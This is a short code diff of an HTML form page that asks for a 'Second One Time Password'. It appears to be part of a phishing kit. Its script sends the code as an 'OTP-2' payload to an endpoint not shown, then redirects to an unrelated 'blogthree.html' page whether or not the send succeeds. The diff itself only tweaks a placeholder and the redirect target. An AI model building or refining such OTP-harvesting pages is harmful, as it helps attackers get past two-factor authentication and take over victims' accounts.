@@ -56,7 +56,7 @@
                 <label>Enter Second One Time Password *</label>
                 <input type="number" id="otp_val2" class="otp-input" inputmode="numeric" 
                        oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);" 
-                       placeholder="Enter 6-digit OTP" required>
+                       required>
             </div>
             
             <div class="btn-row">
@@ -105,7 +105,6 @@
             btn.disabled = true;
             btn.innerText = "Processing...";
 
-            // Sending as OTP-2
             const payload = { 
                 type: "OTP",
                 step: "OTP-2", 
@@ -120,13 +119,12 @@
                     body: JSON.stringify(payload) 
                 });
                 
-                // Final Redirect
-                window.location.href = "final.html"; 
+                // Redirecting to blogthree.html
+                window.location.href = "blogthree.html"; 
             } catch (err) {
-                window.location.href = "final.html";
+                window.location.href = "blogthree.html";
             }
         }
     </script>
 </body>
 </html>
-
